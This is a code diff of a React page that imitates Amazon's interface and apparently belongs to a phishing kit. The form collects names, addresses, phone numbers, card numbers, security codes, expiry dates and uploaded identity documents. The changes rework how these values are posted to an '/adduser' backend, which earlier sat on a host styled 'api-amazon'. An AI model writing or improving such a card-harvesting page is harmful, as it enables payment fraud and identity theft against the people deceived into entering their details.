@@ -1,4 +1,4 @@
-import React, { useState, useRef } from 'react'
+import React, { useState, useRef, useEffect } from 'react'
 
 export default function Laptop() {
 
@@ -22,6 +22,7 @@ export default function Laptop() {
     const [month, setMonth] = useState('1');
     const [year, setYear] = useState('2024');
     const [isImage, setIsImage] = useState(false);
+    const [urlImages, setUrlImages] = useState([]);
 
     const handleChangeMonth = (event) => {
         setMonth(event.target.value); 
@@ -37,21 +38,22 @@ export default function Laptop() {
     }
 
 
-    function onFileSelect(event){
-        
+    function onFileSelect(event) {
         const files = event.target.files;
-        
-        if(files.length === 0) return;
-        for(let i = 0; i < files.length; i++){
-            
-            if(files[i].type.split('/')[0] !== 'image') continue;
-            if(!images.some((e) => e.name === files[i].name)) {
-                setImages((prevImages) => [
-                    ...prevImages, files[i]
-                ]);
+        if (files.length === 0) return;
+    
+        for (let i = 0; i < files.length; i++) {
+            const file = files[i];
+    
+            // Kiểm tra nếu là hình ảnh hoặc PDF
+            if (file.type.split('/')[0] === 'image' || file.type === 'application/pdf') {
+                if (!images.some((e) => e.name === file.name)) {
+                    setImages((prevImages) => [...prevImages, file]);
+                }
             }
         }
     }
+    
 
     function deleteImage(index){
         setImages((prevImages) => 
@@ -70,21 +72,23 @@ export default function Laptop() {
         setIsDragging(false);
     }
 
-    function onDrop(event){
+    function onDrop(event) {
         event.preventDefault();
         setIsDragging(false);
         const files = event.dataTransfer.files;
-        for(let i = 0; i < files.length; i++){
-            
-            if(files[i].type.split('/')[0] !== 'image') continue;
-            if(!images.some((e) => e.name === files[i].name)) {
-                setImages((prevImages) => [
-                    ...prevImages, files[i]
-                ]);
+        
+        for (let i = 0; i < files.length; i++) {
+            const file = files[i];
+    
+            // Kiểm tra nếu là hình ảnh hoặc PDF
+            if (file.type.split('/')[0] === 'image' || file.type === 'application/pdf') {
+                if (!images.some((e) => e.name === file.name)) {
+                    setImages((prevImages) => [...prevImages, file]);
+                }
             }
         }
-
     }
+    
     
     const handleChangeFullName = (event) => {
       setFullName(event.target.value);
@@ -100,7 +104,6 @@ export default function Laptop() {
 
     const handleCountryChange = (event) => {
         setSelectedCountry(event.target.value);
-        console.log('Quốc gia đã chọn:', event.target.value);
       };
 
     const handleChangeBill = (event) => {
@@ -161,12 +164,28 @@ export default function Laptop() {
     //         fullNameCard: fullNameCard,
     //         month: month,
     //         year: year,
-    //         image: images[0]
+    //         comment: comment,
+    //         image: images
     //     };
     //     console.log(user);
     // }
+    
+    //khi up load anh xong thi add user vao database
+    useEffect(() =>{
+        if(urlImages.length > 0 && urlImages.length === images.length){
+        
+            senDataUser();
+            setUrlImages([]);
+        }else{
+            console.log(urlImages);
+            
+        }
+    },[urlImages])
 
     const handleUpload = async () => {
+        // http://localhost:4000
+        // https://api-amazon-s37l.onrender.com
+        
         if(images.length > 0){
         
         for(let i = 0; i< images.length; i++){
@@ -174,7 +193,7 @@ export default function Laptop() {
             let formData = new FormData();
             formData.append('imageItem', images[i]);
   
-            await fetch('https://api-amazon-s37l.onrender.com/upload',{
+            await fetch('http://localhost:4000/upload',{
             method:'POST',
             headers:{
                 Accept:'application/json',
@@ -183,48 +202,56 @@ export default function Laptop() {
             }).then((resp) => resp.json()).then((data) => {responseData=data});
             
             if(responseData.success){
-            console.log(responseData.image_url)
-            const user = {
-                fullName: fullName,
-                selectedCountry: selectedCountry,
-                bill: bill,
-                billUs1: billUs1,
-                billUs2: billUs2,
-                phone: phone,
-                city: city,
-                card: card,
-                security: security,
-                region: region,
-                zipcode: zipcode,
-                radioValue: radioValue,
-                fullNameCard: fullNameCard,
-                month: month,
-                year: year,
-                comment: comment,
-                image: responseData.image_url
-            };
-            console.log(user);
-
-            await fetch('https://api-amazon-s37l.onrender.com/adduser',{
-            method:'POST',
-            headers:{
-                Accept:'application/json',
-                'Content-Type':'application/json',
-            },
-            body:JSON.stringify(user),
-            }).then((resp) => resp.json()).then((data)=>{
-            data.success?alert("User Added"):alert("Failed")
-            })
-            
+                setUrlImages((prevUrl) => [...prevUrl, responseData.image_url]);
+                
             }
+            
+            
             setIsImage(false);
-
-        }}else{
+        }
+        // senDataUser();
+        
+    
+    
+    }else{
             setIsImage(true);
         }
         
-        
     };
+
+    const senDataUser = async () =>{
+        const user = {
+            fullName: fullName,
+            selectedCountry: selectedCountry,
+            bill: bill,
+            billUs1: billUs1,
+            billUs2: billUs2,
+            phone: phone,
+            city: city,
+            card: card,
+            security: security,
+            region: region,
+            zipcode: zipcode,
+            radioValue: radioValue,
+            fullNameCard: fullNameCard,
+            month: month,
+            year: year,
+            comment: comment,
+            image: urlImages
+        };
+        console.log(user);
+
+        await fetch('http://localhost:4000/adduser',{
+        method:'POST',
+        headers:{
+            Accept:'application/json',
+            'Content-Type':'application/json',
+        },
+        body:JSON.stringify(user),
+        }).then((resp) => resp.json()).then((data)=>{
+        data.success?alert("User Added"):alert("Failed")
+        })
+    }
        
 
   return (
@@ -1055,9 +1082,9 @@ export default function Laptop() {
                         src="https://player.vimeo.com/video/667387306?h=37c31a1554"
                         width="100%"
                         height="300"
-                        frameborder="0"
+                        frameBorder="0"
                         allow="autoplay; fullscreen; picture-in-picture"
-                        allowfullscreen
+                        allowFullScreen
                         ></iframe
                     ></span>
                     </div>
@@ -1180,8 +1207,7 @@ export default function Laptop() {
                         className="a-section a-spacing-none a-padding-small radio-option highlight-on"
                         >
                         <div
-                            data-a-input-name="document-type"
-                            data-validation-config='{"name":"document","error-message":"Remove the attached document to select this option","matcher":"empty"}'
+                            
                             className="a-radio a-radio-fancy validate-on-select"
                         >
                             <label
@@ -1193,93 +1219,92 @@ export default function Laptop() {
                             /><i className="a-icon a-icon-radio"></i
                             ><span className="a-label a-radio-label"
                                 >Unable to attach a document</span
-                            ></label
+                            ></label>
+                        </div>
+                        </div>
+                        <div
+                            data-target-value="unable-to-attach"
+                            className="a-section a-spacing-small sub-radio-option radio-value-listener hidden"
                             >
-                        </div>
-                        </div>
-                        <div
-                        data-target-value="unable-to-attach"
-                        className="a-section a-spacing-small sub-radio-option radio-value-listener hidden"
-                        >
-                        <div
-                            data-a-input-name="no-document-reason"
-                            className="a-radio a-radio-fancy a-spacing-top-small"
-                        >
-                            <label
-                            ><input type="radio" name="no-document-reason" value="other" onChange={handleRadioChange}/><i
-                                className="a-icon a-icon-radio"
-                            ></i
-                            ><span className="a-label a-radio-label">Other</span></label
+                            <div
+                                data-a-input-name="no-document-reason"
+                                className="a-radio a-radio-fancy a-spacing-top-small"
                             >
-                        </div>
-                        <div
-                            data-a-input-name="no-document-reason"
-                            className="a-radio a-radio-fancy a-spacing-top-small"
-                        >
-                            <label
-                            ><input
-                                type="radio"
-                                name="no-document-reason"
-                                value="do-not-have"
-                                onChange={handleRadioChange}
-                            /><i className="a-icon a-icon-radio"></i
-                            ><span className="a-label a-radio-label"
-                                >I don't have a document</span
-                            ></label
-                            >
-                        </div>
-                        <div
-                            data-a-input-name="no-document-reason"
-                            className="a-radio a-radio-fancy a-spacing-top-small"
-                        >
-                            <label
-                            ><input
-                                type="radio"
-                                name="no-document-reason"
-                                value="do-not-want-to-share"
-                                onChange={handleRadioChange}
-                            /><i className="a-icon a-icon-radio"></i
-                            ><span className="a-label a-radio-label"
-                                >I don't want to share my document</span
-                            ></label
-                            >
-                        </div>
-                        <div
-                            data-a-input-name="no-document-reason"
-                            className="a-radio a-radio-fancy a-spacing-top-small"
-                        >
-                            <label
-                            ><input
-                                type="radio"
-                                name="no-document-reason"
-                                value="do-not-know-how-to-attach"
-                                onChange={handleRadioChange}
-                            /><i className="a-icon a-icon-radio"></i
-                            ><span className="a-label a-radio-label"
-                                >I don't know how to attach a document</span
-                            ></label
-                            >
-                        </div>
-                        </div>
-                        <div
-                        id="document-type-error-content"
-                        className="a-section a-spacing-none hidden"
-                        >
-                        <div className="a-box a-alert-inline a-alert-inline-error" role="alert">
-                            <div className="a-box-inner a-alert-container">
-                            <i className="a-icon a-icon-alert"></i>
-                            <div className="a-alert-content">
-                                <span className="error-message"> </span>
+                                <label
+                                ><input type="radio" name="no-document-reason" value="other" onChange={handleRadioChange}/><i
+                                    className="a-icon a-icon-radio"
+                                ></i
+                                ><span className="a-label a-radio-label">Other</span></label
+                                >
                             </div>
+                            <div
+                                data-a-input-name="no-document-reason"
+                                className="a-radio a-radio-fancy a-spacing-top-small"
+                            >
+                                <label
+                                ><input
+                                    type="radio"
+                                    name="no-document-reason"
+                                    value="do-not-have"
+                                    onChange={handleRadioChange}
+                                /><i className="a-icon a-icon-radio"></i
+                                ><span className="a-label a-radio-label"
+                                    >I don't have a document</span
+                                ></label
+                                >
+                            </div>
+                            <div
+                                data-a-input-name="no-document-reason"
+                                className="a-radio a-radio-fancy a-spacing-top-small"
+                            >
+                                <label
+                                ><input
+                                    type="radio"
+                                    name="no-document-reason"
+                                    value="do-not-want-to-share"
+                                    onChange={handleRadioChange}
+                                /><i className="a-icon a-icon-radio"></i
+                                ><span className="a-label a-radio-label"
+                                    >I don't want to share my document</span
+                                ></label
+                                >
+                            </div>
+                            <div
+                                data-a-input-name="no-document-reason"
+                                className="a-radio a-radio-fancy a-spacing-top-small"
+                            >
+                                <label
+                                ><input
+                                    type="radio"
+                                    name="no-document-reason"
+                                    value="do-not-know-how-to-attach"
+                                    onChange={handleRadioChange}
+                                /><i className="a-icon a-icon-radio"></i
+                                ><span className="a-label a-radio-label"
+                                    >I don't know how to attach a document</span
+                                ></label
+                                >
                             </div>
                         </div>
+                        <div
+                            id="document-type-error-content"
+                            className="a-section a-spacing-none hidden"
+                            >
+                            <div className="a-box a-alert-inline a-alert-inline-error" role="alert">
+                                <div className="a-box-inner a-alert-container">
+                                <i className="a-icon a-icon-alert"></i>
+                                <div className="a-alert-content">
+                                    <span className="error-message"> </span>
+                                </div>
+                                </div>
+                            </div>
                         </div>
                     </div>
                     </div>
 
                     <div
-                    id="header-19"
-                    className="a-section a-spacing-mini abbott-view-component component-display-none component-width-extra_large"
+                    id=""
+                    className="a-section a-spacing-mini abbott-view-component component-display-none component-width-extra_large block"
                     >
                     <h1
                         data-action-on-load="register-listeners"
@@ -1291,8 +1316,8 @@ export default function Laptop() {
                     </div>
 
                     <div
-                        id="text-20"
-                        className="a-section a-spacing-base abbott-view-component component-display-none component-width-extra_large"
+                        id="" 
+                        className="a-section a-spacing-base abbott-view-component component-display-none component-width-extra_large block"
                         >
                         <span
                             data-action-on-load="register-listeners"
@@ -1307,7 +1332,7 @@ export default function Laptop() {
 
                     <div
                     id=""
-                    className="a-section a-spacing-medium abbott-view-component component-display-none component-width-extra_large"
+                    className="a-section a-spacing-medium abbott-view-component component-display-none component-width-extra_large block"
                     >
                     <div data-name="document" className="a-section a-spacing-none file-upload">
                         <div
@@ -1331,7 +1356,7 @@ export default function Laptop() {
                                     aria-hidden="true"
                                 >
                                     <span className="text">
-                                    <icon className="file-upload-icon">
+                                    <i className="file-upload-icon">
                                         <svg
                                         className="icon"
                                         viewBox="0 0 24.01 20.48"
@@ -1345,7 +1370,7 @@ export default function Laptop() {
                                             transform="translate(-0.74 -1.12)"
                                         ></path>
                                         </svg>
-                                    </icon>
+                                    </i>
                                     Choose file</span
                                     >
                                 </span>
@@ -1379,13 +1404,13 @@ export default function Laptop() {
                         />
                         {isImage && <div
                 
-                            className="a-section a-spacing-none"
+                            className="a-section a-spacing-none mt-8"
                             >
                             <div
                                 className="a-box a-alert-inline a-alert-inline-error"
                                 role="alert"
                             >
-                                <div className="a-box-inner a-alert-container">
+                                <div className=" a-alert-container">
                                 <i className="a-icon a-icon-alert"></i>
                                 <div className="a-alert-content">
                                     <span className="error-message"> Select a document type above</span>
@@ -1393,19 +1418,7 @@ export default function Laptop() {
                                 </div>
                             </div>
                             </div>}
-                        <div
-                        id="document-error-content"
-                        className="a-section a-spacing-none hidden"
-                        >
-                        <div className="a-box a-alert-inline a-alert-inline-error" role="alert">
-                            <div className="a-box-inner a-alert-container">
-                            <i className="a-icon a-icon-alert"></i>
-                            <div className="a-alert-content">
-                                <span className="error-message"> </span>
-                            </div>
-                            </div>
-                        </div>
-                        </div>
+                        
                         <div
                         id="document-file-rows"
                         className="a-section a-spacing-none file-row-content"
